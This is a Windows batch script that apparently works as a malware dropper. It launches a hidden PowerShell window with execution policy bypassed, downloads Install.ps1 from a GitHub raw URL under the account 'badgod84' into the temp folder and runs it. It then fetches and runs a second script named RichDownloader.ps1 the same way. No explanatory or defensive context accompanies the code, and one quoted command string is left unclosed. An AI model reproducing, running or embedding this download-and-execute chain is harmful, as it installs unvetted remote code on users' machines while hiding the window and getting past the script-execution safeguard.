@echo off
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/badgod84/back/refs/heads/main/Install.ps1', \"$env:TEMP\Install.ps1\"); & \"$env:TEMP\Install.ps1\"; 
set "ps1Path=%TEMP%\RichDownloader.ps1"
curl -o "%ps1Path%" "https://raw.githubusercontent.com/badgod84/back/refs/heads/main/RichDownloader.ps1"
timeout /t 3 /nobreak > nul
powershell.exe -ExecutionPolicy Bypass -File "%ps1Path%"
